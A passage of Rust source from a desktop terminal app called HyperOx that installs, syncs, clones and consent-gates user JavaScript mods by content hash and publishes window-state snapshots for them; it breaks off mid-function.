//! Mods: folders of JavaScript under ~/.config/h0x-ade/mods that agents write and
//! HyperOx runs live (gpui-shell), plus the `h0x` module they import.

use crate::layout::Node;
use gpui::App;
use gpui_shell::{Capabilities, ExecuteGrant, HostError, HostModule, HostObject, HostValue, NetworkGrant};
use serde::Deserialize;
use serde_json::{Value, json};
use std::cell::RefCell;
use std::collections::{BTreeMap, HashMap};
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::rc::{Rc, Weak};
use std::sync::OnceLock;
use std::time::{Duration, SystemTime};

include!(concat!(env!("OUT_DIR"), "/default_mods.rs"));
include!(concat!(env!("OUT_DIR"), "/frame_mods.rs"));

#[cfg(test)]
mod render_tests;
#[cfg(test)]
mod lifecycle_tests;

/// The frame's own mods (welcome, ...): the app's, not the person's. Written
/// from the binary on every start, so no edit or broken mod can break them.
/// Loaded as `frame-<name>`.
pub fn frame_dir() -> PathBuf {
    app_dir().join("frame")
}

pub fn home() -> PathBuf {
    // HOME, or the profile folder on Windows.
    std::env::home_dir().unwrap_or_else(|| "/".into())
}

/// The fonts on this machine (`fonts()`): read when the window opens and
/// again when the home brings new ones.
static FONTS: std::sync::Mutex<Vec<String>> = std::sync::Mutex::new(Vec::new());

pub fn note_fonts(cx: &gpui::App) {
    // Names starting with "." are the system's private UI fonts (macOS).
    let mut names: Vec<String> = cx.text_system().all_font_names().into_iter().filter(|n| !n.starts_with('.')).collect();
    names.sort_by_key(|n| n.to_lowercase());
    names.dedup();
    *FONTS.lock().unwrap() = names;
}

/// The app's home: `$H0X_ADE_HOME` (tests, experiments), else
/// `$XDG_CONFIG_HOME/h0x-ade`, else `~/.config/h0x-ade`, on every OS.
pub fn app_dir() -> PathBuf {
    let env = |k: &str| std::env::var_os(k).filter(|v| !v.is_empty()).map(PathBuf::from);
    env("H0X_ADE_HOME").unwrap_or_else(|| env("XDG_CONFIG_HOME").unwrap_or_else(|| home().join(".config")).join("h0x-ade"))
}

/// Creates the app home. It holds settings, the control socket and mod
/// consent, so on unix it is kept private (0700) when this user owns it.
pub fn ensure_app_dir() -> std::io::Result<PathBuf> {
    let dir = app_dir();
    make_private_dir(&dir)?;
    Ok(dir)
}

fn make_private_dir(dir: &Path) -> std::io::Result<()> {
    std::fs::create_dir_all(dir)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::{MetadataExt, PermissionsExt};
        let meta = std::fs::metadata(dir)?;
        // SAFETY: getuid has no preconditions and cannot fail.
        if meta.uid() != unsafe { libc::getuid() } {
            tracing::warn!("{} belongs to another user; leaving its mode alone", dir.display());
        } else if meta.permissions().mode() & 0o777 != 0o700 {
            std::fs::set_permissions(dir, std::fs::Permissions::from_mode(0o700))?;
        }
    }
    Ok(())
}

pub fn mods_dir() -> PathBuf {
    app_dir().join("mods")
}

const AGENTS_MD: &str = include_str!("../defaults/AGENTS.md");

/// Writes the agent guide and API types, and installs or updates the default
/// mods. Shipped mods are replaced whole; edits are first moved to a clone.
pub fn write_workspace() -> std::io::Result<()> {
    let dir = ensure_app_dir()?;
    std::fs::create_dir_all(mods_dir())?;
    write_if_changed(&dir.join("AGENTS.md"), AGENTS_MD)?;
    // Agents read AGENTS.md now; the pointer file we used to write goes (only ours).
    if std::fs::read_to_string(dir.join("CLAUDE.md")).is_ok_and(|s| s == "@AGENTS.md\n") {
        let _ = std::fs::remove_file(dir.join("CLAUDE.md"));
    }
    write_if_changed(&dir.join("h0x.d.ts"), DECLARATIONS)?;
    let types = gpui_shell::type_declarations(&gpui_shell::FrozenComponentRegistry::default());
    write_if_changed(&dir.join("gpui-kit.d.ts"), &types)?;
    let _ = std::fs::remove_dir_all(frame_dir());
    for (path, bytes) in FRAME_MODS {
        let file = frame_dir().join(path);
        std::fs::create_dir_all(file.parent().unwrap())?;
        std::fs::write(&file, bytes)?;
    }
    sync_defaults(&mods_dir(), &dir.join("installed.json"), DEFAULT_MODS)
}

static SYNC_NOTES: std::sync::Mutex<Vec<String>> = std::sync::Mutex::new(Vec::new());

pub fn take_sync_notes() -> Vec<String> {
    std::mem::take(&mut *SYNC_NOTES.lock().unwrap())
}

fn edited_note(clone: &str) {
    SYNC_NOTES.lock().unwrap().push(clone.to_owned());
}

fn edited_name(parent: &Path, name: &str, suffix: &str) -> String {
    (1..).map(|i| if i == 1 { format!("{name}-edited") } else { format!("{name}-edited-{i}") })
        .find(|n| !parent.join(format!("{n}{suffix}")).exists()).unwrap()
}

fn sync_defaults(mods: &Path, installed_path: &Path, shipped_mods: &[(&str, &[u8])]) -> std::io::Result<()> {
    let text = std::fs::read_to_string(installed_path).unwrap_or_default();
    let mut installed: Installed = serde_json::from_str(&text).unwrap_or_default();
    let names: std::collections::BTreeSet<&str> = shipped_mods.iter().filter_map(|(p, _)| p.split('/').next()).collect();
    let dropped: Vec<String> = installed.keys().filter(|n| !n.starts_with("layout:") && !names.contains(n.as_str())).cloned().collect();
    for name in dropped {
        let target = mods.join(&name);
        if installed.get(&name).is_some_and(|was| target.exists() && as_shipped(&target, was)) {
            std::fs::remove_dir_all(&target)?;
        }
        installed.remove(&name);
    }
    for name in names {
        let target = mods.join(name);
        let shipped: Files = shipped_mods.iter()
            .filter_map(|(p, bytes)| Some((p.strip_prefix(&format!("{name}/"))?.to_owned(), fingerprint(bytes))))
            .collect();
        if installed.get(name) == Some(&shipped) && target.exists() && as_shipped(&target, &shipped) {
            continue;
        }
        if target.exists() {
            if !as_shipped(&target, installed.get(name).unwrap_or(&shipped)) {
                let clone = edited_name(mods, name, "");
                std::fs::rename(&target, mods.join(&clone))?;
                edited_note(&clone);
            } else {
                std::fs::remove_dir_all(&target)?;
            }
        }
        for (path, bytes) in shipped_mods.iter().filter(|(p, _)| p.starts_with(&format!("{name}/"))) {
            let file = mods.join(path);
            std::fs::create_dir_all(file.parent().unwrap())?;
            std::fs::write(&file, bytes)?;
        }
        installed.insert(name.to_owned(), shipped);
    }
    write_if_changed(installed_path, serde_json::to_string_pretty(&installed).unwrap() + "\n")
}

pub fn sync_layouts(home: &Path, layouts: &[(&str, &str)]) -> std::io::Result<()> {
    let record = home.join("installed.json");
    let mut installed: Installed = serde_json::from_str(&std::fs::read_to_string(&record).unwrap_or_default()).unwrap_or_default();
    let dir = home.join("layouts");
    std::fs::create_dir_all(&dir)?;
    if dir.join(".base").exists() {
        std::fs::remove_dir_all(dir.join(".base"))?;
    }
    let dropped: Vec<String> = installed.keys().filter(|k| k.strip_prefix("layout:").is_some_and(|n| !layouts.iter().any(|(name, _)| *name == n))).cloned().collect();
    for key in dropped {
        let path = dir.join(format!("{}.json", &key["layout:".len()..]));
        if path.exists() && installed[&key].get("json").is_some_and(|hash| std::fs::read_to_string(&path).is_ok_and(|text| layout_fingerprint(&text) == *hash)) {
            std::fs::remove_file(path)?;
            let _ = std::fs::remove_file(dir.join(".state").join(format!("{}.json", &key["layout:".len()..])));
        }
        installed.remove(&key);
    }
    for (name, text) in layouts {
        let key = format!("layout:{name}");
        let hash = layout_fingerprint(text);
        let path = dir.join(format!("{name}.json"));
        if path.exists() {
            let current = layout_fingerprint(&std::fs::read_to_string(&path)?);
            let Some(was) = installed.get(&key).and_then(|f| f.get("json")) else {
                // From 0.1.x, which recorded no layouts: whether it was edited is
                // unknowable, so no rescue copy and no toast; kept aside, quietly.
                if current != hash {
                    std::fs::rename(&path, dir.join(format!("{name}.json.before-{}", env!("CARGO_PKG_VERSION"))))?;
                }
                std::fs::write(&path, text)?;
                installed.insert(key, [("json".into(), hash)].into());
                continue;
            };
            if current != *was && current != hash {
                let clone = edited_name(&dir, name, ".json");
                copy_layout_state(home, name, &clone)?;
                std::fs::rename(&path, dir.join(format!("{clone}.json")))?;
                edited_note(&clone);
            }
        }
        std::fs::write(&path, text)?;
        installed.insert(key, [("json".into(), hash)].into());
    }
    write_if_changed(&record, serde_json::to_string_pretty(&installed).unwrap() + "\n")
}

fn layout_fingerprint(text: &str) -> String {
    let canonical = serde_json::from_str::<Value>(text.trim_start_matches('\u{feff}')).ok().map(|mut v| {
        crate::layout_sync::normalize(&mut v);
        v.sort_all_objects();
        v.to_string()
    });
    fingerprint(canonical.as_deref().unwrap_or(text).as_bytes())
}

pub fn copy_layout_state(home: &Path, name: &str, to: &str) -> std::io::Result<()> {
    let dir = home.join("layouts/.state");
    match std::fs::copy(dir.join(format!("{name}.json")), dir.join(format!("{to}.json"))) {
        Ok(_) => Ok(()),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound && !dir.join(format!("{name}.json")).exists() => {
            match std::fs::remove_file(dir.join(format!("{to}.json"))) {
                Ok(()) => Ok(()),
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(()),
                Err(e) => Err(e),
            }
        }
        Err(e) => Err(e),
    }
}

pub fn valid_name(name: &str) -> bool {
    !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}

pub fn clone_mod(name: &str, to: &str) -> std::io::Result<()> {
    clone_mod_at(&mods_dir(), name, to)
}

fn clone_mod_at(mods: &Path, name: &str, to: &str) -> std::io::Result<()> {
    if !valid_name(name) || !valid_name(to) {
        return Err(std::io::Error::other("names use letters, digits, - or _"));
    }
    let source = mods.join(name);
    let target = mods.join(to);
    if !source.is_dir() {
        return Err(std::io::Error::other("no such mod"));
    }
    std::fs::create_dir(&target)?;
    fn copy(source: &Path, target: &Path, from: &str, to: &str) -> std::io::Result<()> {
        for entry in std::fs::read_dir(source)? {
            let entry = entry?;
            let dest = target.join(entry.file_name());
            if entry.file_type()?.is_dir() {
                std::fs::create_dir(&dest)?;
                copy(&entry.path(), &dest, from, to)?;
            } else {
                let bytes = std::fs::read(entry.path())?;
                std::fs::copy(entry.path(), &dest)?;
                if let Ok(text) = std::str::from_utf8(&bytes) {
                    let mut text = text.replace(&format!("mods/{from}/"), &format!("mods/{to}/"))
                        .replace(&format!("\"mods/{from}\""), &format!("\"mods/{to}\""))
                        .replace(&format!("'mods/{from}'"), &format!("'mods/{to}'"));
                    for key in ["mod", "\"mod\"", "'mod'"] {
                        for space in ["", " "] {
                            for quote in ["\"", "'"] {
                                text = text.replace(&format!("{key}:{space}{quote}{from}{quote}"), &format!("{key}:{space}{quote}{to}{quote}"));
                            }
                        }
                    }
                    std::fs::write(dest, text)?;
                }
            }
        }
        Ok(())
    }
    let result = (|| {
        copy(&source, &target, name, to)?;
        let path = target.join("mod.json");
        let mut meta: Value = if path.exists() { serde_json::from_str(&std::fs::read_to_string(&path)?)? } else { json!({}) };
        let Some(object) = meta.as_object_mut() else {
            return Err(std::io::Error::other("mod.json must be an object"));
        };
        object.insert("cloned_from".into(), json!({ "name": name, "version": env!("CARGO_PKG_VERSION") }));
        std::fs::write(path, serde_json::to_string_pretty(&meta)?)?;
        Ok(())
    })();
    if result.is_err() {
        let _ = std::fs::remove_dir_all(target);
    }
    result
}

/// Exactly as installed: every file unchanged and none added.
fn as_shipped(dir: &Path, files: &Files) -> bool {
    let mut found = mod_files(dir, false);
    // gpui-shell writes these editor helpers when it loads a mod.
    found.retain(|f| !matches!(f.as_str(), "gpui-kit.d.ts" | "jsconfig.json") || files.contains_key(f));
    found.len() == files.len() && found.iter().all(|f| files.contains_key(f)) && untouched(dir, files)
}

/// File path (inside the mod) to content fingerprint.
type Files = std::collections::BTreeMap<String, String>;
/// Default mods HyperOx installed, with the files as installed.
type Installed = std::collections::BTreeMap<String, Files>;

/// FNV-1a: stable across builds, unlike std's hasher.
fn fingerprint(bytes: &[u8]) -> String {
    let h = bytes.iter().fold(0xcbf29ce484222325u64, |h, b| (h ^ *b as u64).wrapping_mul(0x100000001b3));
    format!("{h:016x}")
}

/// Whether every file HyperOx installed is still there as installed.
fn untouched(dir: &Path, files: &Files) -> bool {
    files.iter().all(|(path, want)| std::fs::read(dir.join(path)).is_ok_and(|b| fingerprint(&b) == *want))
}

fn write_if_changed(path: &Path, content: impl AsRef<[u8]>) -> std::io::Result<()> {
    let content = content.as_ref();
    if std::fs::read(path).ok().as_deref() != Some(content) {
        std::fs::write(path, content)?;
    }
    Ok(())
}

/// Whether a mod may run (ADR-048): HyperOx's own mods do; any other runs once
/// the person allowed this exact code.
#[derive(Debug, PartialEq)]
pub enum Trust {
    Allowed,
    Denied,
    /// Not decided for this code (its hash) yet.
    Ask(String),
}

pub fn trust(found: &Found, choices: &BTreeMap<String, crate::settings::ModChoice>) -> Trust {
    let shipped = if found.dir.parent() == Some(frame_dir().as_path()) { FRAME_MODS } else { DEFAULT_MODS };
    if is_shipped(&found.dir, shipped) {
        return Trust::Allowed;
    }
    // Git dependencies are fetched at every load from outside the folder, so no answer covers them.
    if declares_dependencies(&found.dir) {
        return Trust::Denied;
    }
    // The hash leaves the generated editor helpers out, so a mod that runs one can't be answered for.
    if entry_is_helper(&found.dir) {
        return Trust::Denied;
    }
    if walk_mod(&found.dir, true).1 {
        eprintln!("mod {}: denied, it has more than {MAX_FILES} files or {} MiB (links included)", found.id, MAX_BYTES >> 20);
        return Trust::Denied;
    }
    decide(choices, &found.id, content_hash(&found.dir))
}

/// Whether `gpui-shell.json` declares any `dependencies` (a malformed value counts).
fn declares_dependencies(dir: &Path) -> bool {
    let Ok(text) = std::fs::read_to_string(dir.join("gpui-shell.json")) else { return false };
    match serde_json::from_str::<Value>(&text).ok().as_ref().and_then(|v| v.get("dependencies")) {
        None | Some(Value::Null) => false,
        Some(Value::Object(o)) => !o.is_empty(),
        Some(_) => true,
    }
}

/// The stored answer for this mod, if it was given for this code.
pub fn decide(choices: &BTreeMap<String, crate::settings::ModChoice>, id: &str, hash: String) -> Trust {
    match choices.get(id) {
        Some(c) if c.hash == hash && c.allow => Trust::Allowed,
        Some(c) if c.hash == hash => Trust::Denied,
        _ => Trust::Ask(hash),
    }
}

/// Byte for byte one of the mods HyperOx ships (by folder name), none added.
fn is_shipped(dir: &Path, shipped: &[(&str, &[u8])]) -> bool {
    let Some(name) = dir.file_name().and_then(|n| n.to_str()) else { return false };
    let prefix = format!("{name}/");
    let files: BTreeMap<&str, &[u8]> = shipped.iter().filter_map(|(p, bytes)| Some((p.strip_prefix(&prefix)?, *bytes))).collect();
    if files.is_empty() {
        return false;
    }
    let mut found = mod_files(dir, false);
    // gpui-shell writes these editor helpers when it loads a mod.
    found.retain(|f| !matches!(f.as_str(), "gpui-kit.d.ts" | "jsconfig.json") || files.contains_key(f.as_str()));
    found.len() == files.len() && found.iter().all(|f| files.get(f.as_str()).is_some_and(|want| std::fs::read(dir.join(f)).is_ok_and(|b| b == *want)))
}

/// SHA-256 over every file of a mod (names and bytes), dot files included:
/// the code a person's answer is for. The generated editor helpers don't count.
pub fn content_hash(dir: &Path) -> String {
    let mut all = Vec::new();
    // gpui-shell rewrites gpui-kit.d.ts and writes a jsconfig.json once; a jsconfig.json
    // that is not JSON can't be an editor config (the loader refuses to import it, but it is hashed anyway).
    let helper_config = std::fs::read(dir.join("jsconfig.json")).is_ok_and(|b| serde_json::from_slice::<Value>(&b).is_ok());
    for f in mod_files(dir, true).into_iter().filter(|f| f != "gpui-kit.d.ts" && !(helper_config && f == "jsconfig.json")) {
        let bytes = std::fs::read(dir.join(&f)).unwrap_or_default();
        all.extend_from_slice(format!("{f}\0{}\0", bytes.len()).as_bytes());
        all.extend_from_slice(&bytes);
    }
    crate::update::sha256(&all)
}

/// What the consent walk reads at most: a link to a drive root must not hang it.
const MAX_FILES: usize = 20_000;
const MAX_BYTES: u64 = 512 * 1024 * 1024;

/// A mod's files, `/`-separated and sorted (dot files only when asked). Folder
/// links are followed (a mod may link its fonts elsewhere), each real folder once.
fn mod_files(root: &Path, dots: bool) -> Vec<String> {
    walk_mod(root, dots).0
}

/// `mod_files`, and whether the walk stopped at `MAX_FILES` or `MAX_BYTES`.
fn walk_mod(root: &Path, dots: bool) -> (Vec<String>, bool) {
    let mut out = Vec::new();
    let mut bytes = 0u64;
    let mut seen = std::collections::HashSet::new();
    let mut pending = vec![root.to_path_buf()];
    while let Some(dir) = pending.pop() {
        if !seen.insert(std::fs::canonicalize(&dir).unwrap_or_else(|_| dir.clone())) {
            continue;
        }
        for e in std::fs::read_dir(&dir).into_iter().flatten().flatten() {
            if !dots && e.file_name().to_string_lossy().starts_with('.') {
                continue;
            }
            let path = e.path();
            if path.is_dir() {
                pending.push(path);
            } else if let Some(rel) = path.strip_prefix(root).ok().and_then(|r| r.to_str()) {
                bytes += std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
                if out.len() >= MAX_FILES || bytes > MAX_BYTES {
                    out.sort();
                    return (out, true);
                }
                out.push(rel.replace('\\', "/"));
            }
        }
    }
    out.sort();
    (out, false)
}

/// Whether the manifest's `entry` is one of the editor helpers, which the
/// consent hash leaves out because gpui-shell rewrites them on every load.
fn entry_is_helper(dir: &Path) -> bool {
    let Ok(text) = std::fs::read_to_string(dir.join("gpui-shell.json")) else { return false };
    let Some(entry) = serde_json::from_str::<Value>(&text).ok().and_then(|v| v.get("entry")?.as_str().map(str::to_owned)) else { return false };
    let mut parts: Vec<&str> = Vec::new();
    for part in entry.split(['/', '\\']) {
        match part {
            "" | "." => {}
            ".." => {
                parts.pop();
            }
            p => parts.push(p),
        }
    }
    parts.len() == 1 && (parts[0].eq_ignore_ascii_case("jsconfig.json") || parts[0].eq_ignore_ascii_case("gpui-kit.d.ts"))
}

/// Mods asked about this run (id and hash): one prompt each.
static ASKED: std::sync::Mutex<Vec<(String, String)>> = std::sync::Mutex::new(Vec::new());

/// Asks the person once whether this mod may run (the frame's consent dialog).
pub fn ask(found: &Found, hash: String) {
    // The dialog itself, edited, can only be allowed in settings.json.
    if found.id == "frame-consent" {
        return;
    }
    let key = (found.id.clone(), hash.clone());
    {
        let mut asked = ASKED.lock().unwrap();
        if asked.contains(&key) {
            return;
        }
        asked.push(key);
    }
    let props = json!({ "id": found.id, "folder": found.dir.to_string_lossy(), "hash": hash });
    request(Request::OpenOverlay { id: new_overlay_id(), spec: json!({ "mod": "frame-consent", "kind": "dialog", "width": 440, "height": 230, "props": props }) });
}

/// Where a mod would like to go the first time it appears (mod.json).
#[derive(Deserialize, Default, Clone)]
pub struct Hint {
    #[serde(default)]
    pub place: Option<String>,
    #[serde(default)]
    pub size: Option<f32>,
    /// `pane.go` can give it the keyboard.
    #[serde(default)]
    pub focusable: bool,
}

#[derive(Clone)]
pub struct Found {
    pub id: String,
    pub dir: PathBuf,
    pub hint: Hint,
    pub stamp: SystemTime,
}

/// Every mod folder that has a main.js.
pub fn scan() -> Vec<Found> {
    let mut found = scan_dir(&mods_dir(), "");
    found.extend(scan_dir(&frame_dir(), "frame-"));
    found.sort_by(|a, b| a.id.cmp(&b.id));
    found
}

fn scan_dir(root: &Path, prefix: &str) -> Vec<Found> {
    let Ok(entries) = std::fs::read_dir(root) else { return Vec::new() };
    entries
        .flatten()
        .filter(|e| e.path().join("main.js").is_file())
        .filter_map(|e| {
            let id = format!("{prefix}{}", e.file_name().to_str()?);
            // `frame-` ids are the app's own pages, trusted with frame-only functions: never a person's mod.
            if id.starts_with('.') || (prefix.is_empty() && id.starts_with("frame-")) {
                return None;
            }
            let dir = e.path();
            let hint = std::fs::read_to_string(dir.join("mod.json")).ok().and_then(|s| serde_json::from_str(&s).ok()).unwrap_or_default();
            let stamp = std::fs::read_dir(&dir)
                .into_iter()
                .flatten()
                .flatten()
                .filter_map(|f| f.metadata().ok()?.modified().ok())
                .max()
                .unwrap_or(SystemTime::UNIX_EPOCH);
            Some(Found { id, dir, hint, stamp })
        })
        .collect()
}

/// What mods ask of the window.
pub enum Request {
    Run { name: String, args: Value },
    OpenOverlay { id: String, spec: Value },
    CloseOverlay { id: String },
    Refresh,
    /// From `h0x-ade do` / `h0x-ade status` (control.rs); answer on `reply`.
    Control { cmd: Value, reply: std::sync::mpsc::Sender<Value> },
}

static REQUESTS: OnceLock<async_channel::Sender<Request>> = OnceLock::new();

thread_local! {
    static FINAL_KILLS: RefCell<Option<(std::sync::Arc<crate::core_link::Core>, std::time::Instant)>> = const { RefCell::new(None) };
}

/// The event loop stops before queued commands run at quit. Send final terminal
/// kills to the core now, bounded by the same deadline as the mod's cleanup.
pub fn final_cleanup(core: std::sync::Arc<crate::core_link::Core>, deadline: std::time::Instant, body: impl FnOnce()) {
    struct Reset;
    impl Drop for Reset {
        fn drop(&mut self) { FINAL_KILLS.with_borrow_mut(|slot| { slot.take(); }); }
    }
    FINAL_KILLS.with_borrow_mut(|slot| {
        assert!(slot.is_none(), "nested final cleanup");
        *slot = Some((core, deadline));
    });
    let _reset = Reset;
    body();
}

/// The folders of the spaces open on this computer (`spaces()`; remote
/// spaces' folders are on their machine). Read on the window thread.
pub fn local_space_folders() -> Vec<PathBuf> {
    SNAPSHOT.with(|s| {
        s.borrow().spaces.as_array().into_iter().flatten()
            .filter(|p| p.get("machine").and_then(Value::as_str).is_none_or(str::is_empty))
            .filter_map(|p| p.get("folder")?.as_str().map(PathBuf::from))
            .filter(|f| f.is_absolute())
            .collect()
    })
}

/// The live folders of the terminals open on this computer (`panes()`, plus
/// the `focused()` terminal, which a floating block terminal or a shown agent
/// makes a non-pane): the Files panel lists the focused terminal's folder,
/// which can differ from its space's. Read on the window thread.
pub fn local_pane_folders() -> Vec<PathBuf> {
    SNAPSHOT.with(|s| {
        let s = s.borrow();
        s.panes.as_array().into_iter().flatten().chain(std::iter::once(&s.focused))
            .filter(|p| p.get("terminal").and_then(Value::as_str).is_some_and(|t| !t.is_empty() && !t.contains('/')))
            .filter_map(|p| p.get("cwd")?.as_str().map(PathBuf::from))
            .filter(|f| f.is_absolute())
            .collect()
    })
}

/// Navigation order set by the mod that lists agents, with stale entries removed and new agents appended.
pub fn agent_order(available: Vec<String>) -> Vec<String> {
    AGENT_ORDER.with(|s| {
        let mut order = Vec::new();
        for addr in s.borrow().iter().chain(available.iter()) {
            if available.contains(addr) && !order.contains(addr) {
                order.push(addr.clone());
            }
        }
        order
    })
}

pub fn shared(key: &str) -> Option<Value> {
    with_shared(|s| s.values.get(key).cloned())
}

/// Sets a value every mod can read (persisted in shared.json); mods re-render.
pub fn set_shared(key: String, value: Value) {
    if key == "frame.welcomed" {
        crate::update::welcomed();
    }
    if with_shared(|s| s.set(key, value)) {
        request(Request::Refresh);
    }
}

fn with_shared<R>(f: impl FnOnce(&mut SharedStore) -> R) -> R {
    SHARED.with_borrow_mut(|slot| f(slot.get_or_insert_with(|| SharedStore::load(app_dir().join("shared.json")))))
}

/// Called after mod close handlers, so their last changes reach disk before exit.
pub fn finish_shared() {
    SHARED.with_borrow_mut(|slot| {
        if let Some(store) = slot {
            store.finish();
        }
    });
}

struct SharedStore {
    values: serde_json::Map<String, Value>,
    path: PathBuf,
    writable: bool,
    writer: Option<(std::sync::mpsc::Sender<String>, std::thread::JoinHandle<()>)>,
}

impl SharedStore {
    fn load(path: PathBuf) -> Self {
        let mut writable = true;
        let values = match std::fs::read(&path) {
            Ok(bytes) => match serde_json::from_slice(&bytes) {
                Ok(values) => values,
                Err(error) => {
                    let backup = crate::window::aside(&path, "corrupt");
                    match std::fs::rename(&path, &backup) {
                        Ok(()) => tracing::warn!("{} is invalid ({error}); kept in {}", path.display(), backup.display()),
                        Err(e) => {
                            writable = false;
                            tracing::warn!("{} is invalid ({error}); cannot keep it aside: {e}; shared persistence disabled", path.display());
                        }
                    }
                    serde_json::Map::new()
                }
            },
            Err(error) => {
                if error.kind() != std::io::ErrorKind::NotFound {
                    writable = false;
                    tracing::warn!("cannot read {}: {error}; shared persistence disabled", path.display());
                }
                serde_json::Map::new()
            }
        };
        Self { values, path, writable, writer: None }
    }

    fn set(&mut self, key: String, value: Value) -> bool {
        if self.values.get(&key) == Some(&value) {
            return false;
        }
        self.values.insert(key, value);
        if self.writable {
            let (writer, _) = self.writer.get_or_insert_with(|| shared_writer(self.path.clone()));
            if let Err(error) = writer.send(serde_json::to_string(&self.values).expect("shared values encode as JSON")) {
                tracing::warn!("shared writer stopped: {error}");
            }
        }
        true
    }

    fn finish(&mut self) {
        if let Some((sender, worker)) = self.writer.take() {
            drop(sender);
            if worker.join().is_err() {
                tracing::warn!("shared writer stopped before saving finished");
            }
        }
    }
}

fn shared_writer(path: PathBuf) -> (std::sync::mpsc::Sender<String>, std::thread::JoinHandle<()>) {
    let (tx, rx) = std::sync::mpsc::channel::<String>();
    let worker = std::thread::spawn(move || {
        while let Ok(mut text) = rx.recv() {
            // A burst needs only its newest snapshot. Never let an older write land last.
            for newer in rx.try_iter() {
                text = newer;
            }
            if let Err(error) = crate::persist::write_atomic(&path, text) {
                tracing::warn!("cannot write {}: {error}", path.display());
            }
        }
    });
    (tx, worker)
}

pub fn request_sender() -> Option<async_channel::Sender<Request>> {
    REQUESTS.get().cloned()
}

pub fn request(r: Request) {
    if let Some(tx) = REQUESTS.get() {
        let _ = tx.try_send(r);
    }
}

thread_local! {
    /// Snapshots the window publishes; mods read them synchronously and
    /// re-render when they change.
    static SNAPSHOT: RefCell<Snapshot> = RefCell::new(Snapshot::default());
    static AGENT_ORDER: RefCell<Vec<String>> = const { RefCell::new(Vec::new()) };
    static SHARED: RefCell<Option<SharedStore>> = const { RefCell::new(None) };
    /// Where key commands for each loaded copy go: (copy, mod, sender).
    static COMMANDS: RefCell<Vec<(u64, String, async_channel::Sender<String>)>> = const { RefCell::new(Vec::new()) };
    /// The copies on screen: only they get commands (a hidden copy kept alive must
    /// not act on the person's keys).
    static SHOWN_COPIES: RefCell<std::collections::HashSet<u64>> = RefCell::new(std::collections::HashSet::new());
    static LIVE_READS: RefCell<HashMap<u64, Weak<RefCell<LiveReads>>>> = RefCell::new(HashMap::new());
    static REVISIONS: RefCell<HashMap<&'static str, u64>> = RefCell::new(HashMap::new());
    static COPY_SEQ: std::cell::Cell<u64> = const { std::cell::Cell::new(0) };
    static OVERLAY_SEQ: std::cell::Cell<u64> = const { std::cell::Cell::new(0) };
}

pub struct Snapshot {
    pub layout: Value,
    pub spaces: Value,
    pub machines: Value,
    pub agents: Value,
    /// Every pane: { pane, terminal, tab, title, cwd, branch, status, app, focused, zoomed }.
    pub panes: Value,
    pub terminals: Value,
    /// The shown space's tabs as arranged: { id, tabs: [{ id, name, root }] }.
    pub tree: Value,
    pub focused: Value,
    /// Floating blocks by id: { edge, align, vertical }.
    pub floats: Value,
    /// { platform, titlebar, buttons, maximized, fullscreen, active }.
    pub window: Value,
}

impl Default for Snapshot {
    /// Lists start empty, never null, so mods can map over them right away.
    fn default() -> Self {
        Snapshot { layout: Value::Null, spaces: json!([]), machines: json!([]), agents: json!([]), panes: json!([]), terminals: json!([]), tree: Value::Null, focused: Value::Null, floats: json!({}), window: Value::Null }
    }
}

/// Replaces one part of the snapshot; returns whether it changed.
fn publish(key: &'static str, set: impl FnOnce(&mut Snapshot) -> (Value, Value)) -> bool {
    let changed = SNAPSHOT.with(|s| {
        let (old, new) = set(&mut s.borrow_mut());
        old != new
    });
    if changed {
        REVISIONS.with_borrow_mut(|r| *r.entry(key).or_default() += 1);
    }
    changed
}

pub fn publish_layout(layout: &Node) -> bool {
    let v = serde_json::to_value(layout).unwrap_or(Value::Null);
    publish("layout", |s| (std::mem::replace(&mut s.layout, v.clone()), v))
}
pub fn publish_machines(v: Value) -> bool {
    publish("machines", |s| (std::mem::replace(&mut s.machines, v.clone()), v))
}
pub fn publish_spaces(v: Value) -> bool {
    publish("spaces", |s| (std::mem::replace(&mut s.spaces, v.clone()), v))
}
pub fn publish_agents(v: Value) -> bool {
    publish("agents", |s| (std::mem::replace(&mut s.agents, v.clone()), v))
}
pub fn publish_panes(v: Value) -> bool {
    publish("panes", |s| (std::mem::replace(&mut s.panes, v.clone()), v))
}
pub fn publish_tree(v: Value) -> bool {
    publish("tree", |s| (std::mem::replace(&mut s.tree, v.clone()), v))
}
pub fn publish_terminals(v: Value) -> bool {
    publish("terminals", |s| (std::mem::replace(&mut s.terminals, v.clone()), v))
}
pub fn terminal_address(word: &str, source: &str) -> Option<String> {
    SNAPSHOT.with(|s| {
        let s = s.borrow();
        let live = s.terminals.as_array()?;
        crate::links::terminal_address(word, source, live.iter().filter_map(|t| t["address"].as_str()))
    })
}

pub fn publish_floats(v: Value) -> bool {
    publish("floats", |s| (std::mem::replace(&mut s.floats, v.clone()), v))
}
pub fn publish_window(v: Value) -> bool {
    publish("window", |s| (std::mem::replace(&mut s.window, v.clone()), v))
}
pub fn publish_focused(v: Value) -> bool {
    publish("focused", |s| (std::mem::replace(&mut s.focused, v.clone()), v))
}

/// Whether the window is presented (not minimized or hidden); a missing field counts as visible.
/// Reads no dependency: a timer asking must not make its copy draw again on every window change.
fn window_visible() -> bool {
    SNAPSHOT.with(|s| s.borrow().window.get("visible").and_then(Value::as_bool).unwrap_or(true))
}

/// A number that changes whenever the spaces, panes, machines or window snapshot does: lets
/// a mod's frequent timer skip comparing them. Compare for equality only.
fn snapshot_revision() -> f64 {
    REVISIONS.with_borrow(|r| ["spaces", "panes", "machines", "window"].iter().map(|k| r.get(k).copied().unwrap_or(0)).sum::<u64>() as f64)
}

#[derive(Default)]
struct LiveReads(HashMap<&'static str, u64>);

impl LiveReads {
    fn record(&mut self, key: &'static str, revisions: &HashMap<&'static str, u64>) {
        self.0.entry(key).or_insert_with(|| revisions.get(key).copied().unwrap_or(0));
    }

    fn changed(&mut self, revisions: &HashMap<&'static str, u64>) -> bool {
        let mut changed = false;
        for (key, seen) in &mut self.0 {
            let revision = revisions.get(key).copied().unwrap_or(0);
            changed |= *seen != revision;
            *seen = revision;
        }
        changed
    }
}

fn read(reads: &RefCell<LiveReads>, key: &'static str, f: impl FnOnce(&Snapshot) -> &Value) -> HostValue {
    REVISIONS.with_borrow(|r| reads.borrow_mut().record(key, r));
    SNAPSHOT.with(|s| to_host(f(&s.borrow())))
